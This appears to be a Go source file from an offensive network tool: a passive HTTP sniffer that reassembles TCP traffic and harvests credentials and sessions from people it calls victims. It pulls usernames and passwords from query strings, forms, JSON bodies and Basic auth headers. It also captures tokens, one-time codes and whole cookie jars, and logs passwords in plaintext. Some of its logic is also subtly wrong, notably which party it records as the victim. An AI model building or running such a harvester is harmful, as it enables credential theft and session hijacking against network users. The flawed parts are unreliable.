package sniff

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/tcpassembly"

	"github.com/QYVORA/qyvora-toha3ee/internal/events"
	"github.com/QYVORA/qyvora-toha3ee/internal/store"
)

// credentialFields are form/query keys treated as authentication secrets.
// Matching is case-insensitive at use time; anything in this set that is not
// a dedicated username/password key is captured as an "extra" secret.
var credentialFields = map[string]bool{
	"user": true, "username": true, "userid": true, "user_id": true,
	"login": true, "email": true, "e-mail": true, "email_address": true,
	"pass": true, "password": true, "pwd": true, "passwd": true,
	"passcode": true, "pin": true, "otp": true, "code": true,
	"token": true, "access_token": true, "api_key": true, "apikey": true,
	"secret": true, "auth": true, "key": true,
}

// httpStream reassembles one direction of a TCP connection and dissects HTTP
// request/response traffic. The reassembled bytes are buffered and parsed
// incrementally as complete messages arrive.
type httpStream struct {
	net, transport gopacket.Flow // network and TCP flow identifiers
	sniffer        *Sniffer
	buf            bytes.Buffer // partial reassembled stream
	done           bool
}

// New generates a fresh stream for each TCP connection direction.
func (s *Sniffer) New(netFlow, tcpFlow gopacket.Flow) tcpassembly.Stream {
	return &httpStream{net: netFlow, transport: tcpFlow, sniffer: s}
}

// Reassembled accepts new segment bytes and attempts to parse HTTP.
func (h *httpStream) Reassembled(reassemblies []tcpassembly.Reassembly) {
	for _, r := range reassemblies {
		if len(r.Bytes) == 0 {
			continue
		}
		h.buf.Write(r.Bytes)
	}
	h.parse()
}

// ReassemblyComplete marks the stream finished.
func (h *httpStream) ReassemblyComplete() {
	if h.done {
		return
	}
	h.done = true
	h.parse()
}

// parse consumes as many complete HTTP messages as the buffer holds, then
// returns leaving any partial trailing message in the buffer for later.
func (h *httpStream) parse() {
	for {
		remaining := h.buf.Bytes()
		if len(remaining) == 0 {
			return
		}
		// Responses start with "HTTP/"; requests with a method token.
		if bytes.HasPrefix(remaining, []byte("HTTP/")) {
			if !h.parseResponse(remaining) {
				return
			}
			continue
		}
		if !h.parseRequest(remaining) {
			return
		}
	}
}

// parseRequest consumes one HTTP request from the front of the buffer.
// Returns false if the buffer does not yet hold a complete request.
func (h *httpStream) parseRequest(remaining []byte) bool {
	br := bufio.NewReader(bytes.NewReader(remaining))
	req, err := http.ReadRequest(br)
	if err != nil {
		return false // incomplete or malformed: keep buffering
	}
	// Dissect first: the handler consumes the request body from br.
	h.sniffer.handleRequest(h.net, req)
	// Drain any unread body bytes so the stream stays aligned.
	_, _ = io.Copy(io.Discard, io.LimitReader(req.Body, 4<<20))
	// Everything br consumed (head+headers+body) is finished; drop it so the
	// next message starts parsing at the right offset.
	consumed := len(remaining) - br.Buffered()
	h.buf.Next(consumed)
	return true
}

// parseResponse consumes one HTTP response, extracting Set-Cookie values.
func (h *httpStream) parseResponse(remaining []byte) bool {
	br := bufio.NewReader(bytes.NewReader(remaining))
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		return false
	}
	consumed := len(remaining) - br.Buffered()
	h.buf.Next(consumed)
	h.sniffer.handleResponse(h.net, resp)
	return true
}

// flowIPs extracts the source and destination IPs from a network flow.
func flowIPs(f gopacket.Flow) (src, dst net.IP) {
	src = net.IP(f.Src().Raw())
	dst = net.IP(f.Dst().Raw())
	return
}

// handleRequest extracts credentials and sessions from an HTTP request.
func (s *Sniffer) handleRequest(f gopacket.Flow, req *http.Request) {
	src, _ := flowIPs(f)
	victim := src.String()
	host := req.Host

	// Recon evidence: plaintext HTTP was observed on the wire.
	s.db.Recon.SeesPlainHTTP.Store(true)

	// Query-string credentials.
	s.extractPairs(victim, host, "query", req.URL.Query())

	// Basic authentication. The header is "Basic <base64(user:pass)>";
	// decode it so the username and password are stored separately.
	if auth := req.Header.Get("Authorization"); strings.HasPrefix(auth, "Basic ") {
		raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(strings.TrimPrefix(auth, "Basic ")))
		if err == nil {
			userpass := string(raw)
			if i := strings.IndexByte(userpass, ':'); i >= 0 {
				s.captureCred(store.Cred{
					Service: "http.basic", Username: userpass[:i], Password: userpass[i+1:],
					Host: host, VictimIP: victim, VictimUA: req.UserAgent(),
					Source: fmt.Sprintf("sniff:%s:%s", victim, req.URL.Host),
				})
			}
		}
	}

	// POST bodies: parse per content type, falling back to form parsing when
	// the body looks like a query string.
	if req.Method == http.MethodPost {
		body, _ := io.ReadAll(io.LimitReader(req.Body, 1<<20))
		ct := req.Header.Get("Content-Type")
		switch {
		case strings.Contains(ct, "application/x-www-form-urlencoded"):
			vals, err := url.ParseQuery(string(body))
			if err == nil {
				s.extractPairs(victim, host, "post", vals)
			}
		case strings.Contains(ct, "application/json"):
			for k, v := range guessJSONFields(body) {
				s.captureCred(store.Cred{
					Service: "http.json", Username: k, Password: v,
					Host: host, VictimIP: victim, VictimUA: req.UserAgent(),
					Source: fmt.Sprintf("sniff:%s:%s", victim, req.URL.Path),
				})
			}
		default:
			// Unknown content type: treat as a form if it contains '='.
			if strings.Contains(string(body), "=") {
				vals, err := url.ParseQuery(string(body))
				if err == nil {
					s.extractPairs(victim, host, "post", vals)
				}
			}
		}
	}

	// Cookies -> session capture. Any cookie a client sends is a session
	// bearer token, so the whole jar is stored.
	if cookies := req.Cookies(); len(cookies) > 0 {
		cm := make(map[string]string, len(cookies))
		for _, c := range cookies {
			cm[c.Name] = c.Value
		}
		sess := s.db.AddSession(store.Session{
			VictimIP: victim, Host: host, Cookies: cm,
			AuthHeader: req.Header.Get("Authorization"), Captured: time.Now(),
		})
		s.emitSession(sess)
	}
}

// handleResponse extracts Set-Cookie session tokens.
func (s *Sniffer) handleResponse(f gopacket.Flow, resp *http.Response) {
	for _, c := range resp.Cookies() {
		cm := map[string]string{c.Name: c.Value}
		src, _ := flowIPs(f)
		// The client is the destination of a response, so it is the victim.
		sess := s.db.AddSession(store.Session{
			VictimIP: src.String(), Host: c.Domain, Cookies: cm, Captured: time.Now(),
		})
		s.emitSession(sess)
	}
}

// emitSession persists a session and publishes the event.
func (s *Sniffer) emitSession(sess store.Session) {
	if s.bus != nil {
		s.bus.Emit(events.TopicSessionCaptured, sess)
	}
	if s.db != nil {
		s.db.LogEvent(events.TopicSessionCaptured,
			fmt.Sprintf("session from %s on %s (%d cookies)", sess.VictimIP, sess.Host, len(sess.Cookies)))
	}
}

// extractPairs walks every query/form field and captures credential-looking
// values. Candidate usernames and passwords are gathered separately so the
// best-named key wins, and any other secret keys are kept as extras.
func (s *Sniffer) extractPairs(victim, host, source string, vals url.Values) {
	userCands := map[string]string{}
	passCands := map[string]string{}
	var extra []string
	for k, vs := range vals {
		if len(vs) == 0 {
			continue
		}
		v := vs[0]
		lk := strings.ToLower(k)
		switch {
		case isUsernameKey(lk) && !isButtonLabel(v):
			userCands[lk] = v
		case isPasswordKey(lk):
			passCands[lk] = v
		case isSecretKey(lk):
			extra = append(extra, k+"="+v)
		}
	}
	user := pickUsername(userCands)
	pass := pickPassword(passCands)
	if user != "" || pass != "" {
		s.captureCred(store.Cred{
			Service: "http.form", Username: user, Password: pass,
			Extra: strings.Join(extra, "; "), Host: host,
			VictimIP: victim, Source: fmt.Sprintf("sniff:%s:%s", victim, source),
		})
	}
}

// pickUsername resolves competing username candidates by key priority.
func pickUsername(cands map[string]string) string {
	priority := []string{"user", "username", "userid", "user_id", "email", "e-mail", "email_address", "login"}
	for _, k := range priority {
		if v := cands[k]; v != "" {
			return v
		}
	}
	// No preferred key matched: return any candidate we found.
	for _, v := range cands {
		return v
	}
	return ""
}

// pickPassword resolves competing password candidates by key priority.
func pickPassword(cands map[string]string) string {
	priority := []string{"password", "pass", "pwd", "passwd", "passcode", "pin"}
	for _, k := range priority {
		if v := cands[k]; v != "" {
			return v
		}
	}
	for _, v := range cands {
		return v
	}
	return ""
}

// isButtonLabel reports whether a form value is a submit-button label rather
// than real user input.
func isButtonLabel(v string) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "sign in", "log in", "login", "logon", "submit", "continue", "sign up", "signup", "ok", "okay", "go":
		return true
	}
	return false
}

// isUsernameKey reports whether a lower-cased form key names a user identity.
func isUsernameKey(k string) bool {
	switch k {
	case "user", "username", "userid", "user_id", "login", "email", "e-mail", "email_address":
		return true
	}
	return false
}

// isPasswordKey reports whether a lower-cased form key names a password.
func isPasswordKey(k string) bool {
	switch k {
	case "pass", "password", "pwd", "passwd", "passcode", "pin":
		return true
	}
	return false
}

// isSecretKey reports whether a key is a known secret field that is neither a
// username nor a password (tokens, OTPs, API keys, ...).
func isSecretKey(k string) bool {
	return credentialFields[k] && !isUsernameKey(k) && !isPasswordKey(k)
}

// guessJSONFields is a tiny best-effort JSON credential extractor for common
// {"username": "x", "password": "y"} shapes.
func guessJSONFields(body []byte) map[string]string {
	out := map[string]string{}
	trim := bytes.TrimSpace(body)
	if len(trim) < 2 || trim[0] != '{' {
		return out
	}
	// Parse quoted key:value pairs at depth 0.
	s := string(trim[1 : len(trim)-1])
	for _, seg := range splitJSON(s) {
		kv := strings.SplitN(seg, ":", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(unquoteJSON(kv[0]))
		val := unquoteJSON(kv[1])
		if key == "" {
			continue
		}
		if isUsernameKey(key) || isPasswordKey(key) || isSecretKey(key) {
			out[key] = val
		}
	}
	return out
}

// splitJSON splits a JSON object's interior into top-level key:value segments
// on commas, respecting nesting and quoted strings.
func splitJSON(s string) []string {
	var out []string
	depth := 0
	start := 0
	inStr := false
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '"':
			// A quote toggles string state unless it is escaped.
			if i == 0 || s[i-1] != '\\' {
				inStr = !inStr
			}
		case '{', '[':
			if !inStr {
				depth++
			}
		case '}', ']':
			if !inStr {
				depth--
			}
		case ',':
			// Only top-level commas split entries; commas inside braces or
			// strings are part of a nested value.
			if !inStr && depth == 0 {
				out = append(out, s[start:i])
				start = i + 1
			}
		}
	}
	out = append(out, s[start:])
	return out
}

// unquoteJSON strips surrounding quotes and a trailing comma from a JSON
// token; good enough for the flat shapes we handle.
func unquoteJSON(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "\"")
	s = strings.TrimSuffix(s, "\"")
	s = strings.TrimSuffix(s, ",")
	return s
}

// captureCred stores a credential and publishes it on the bus.
func (s *Sniffer) captureCred(c store.Cred) {
	if s.db == nil {
		return
	}
	creds := s.db.AddCred(c)
	s.db.LogEvent(events.TopicCredFound, fmt.Sprintf(
		"credential (%s): %s / %s from %s", creds.Service, creds.Username, creds.Password, creds.Source))
	if s.bus != nil {
		s.bus.Emit(events.TopicCredFound, creds)
	}
	if s.log != nil {
		s.log.Info("credential captured", "service", creds.Service, "victim", creds.VictimIP)
	}
}

// dissectDNS records hostnames learned from DNS queries onto the requesting
// host, and detects LLMNR/mDNS usage.
func (s *Sniffer) dissectDNS(pkt gopacket.Packet, netLayer gopacket.NetworkLayer, udp *layers.UDP) {
	ip, ok := netLayer.(*layers.IPv4)
	if !ok {
		return
	}
	// Only care about outgoing queries to a resolver (destination port 53).
	if udp.DstPort != 53 {
		return
	}
	dnsL := pkt.Layer(layers.LayerTypeDNS)
	if dnsL == nil {
		return
	}
	dns := dnsL.(*layers.DNS)
	// QR == false means this is a query, not a response; the question holds
	// the hostname the client is resolving.
	if !dns.QR {
		for _, q := range dns.Questions {
			name := string(q.Name)
			if name == "" {
				continue
			}
			// Only fill in the hostname if the host is not already named.
			if h := s.db.Host(ip.SrcIP); h != nil && h.Name == "" {
				s.db.UpsertHost(&store.Host{IP: ip.SrcIP, Name: name})
			}
		}
	}
}
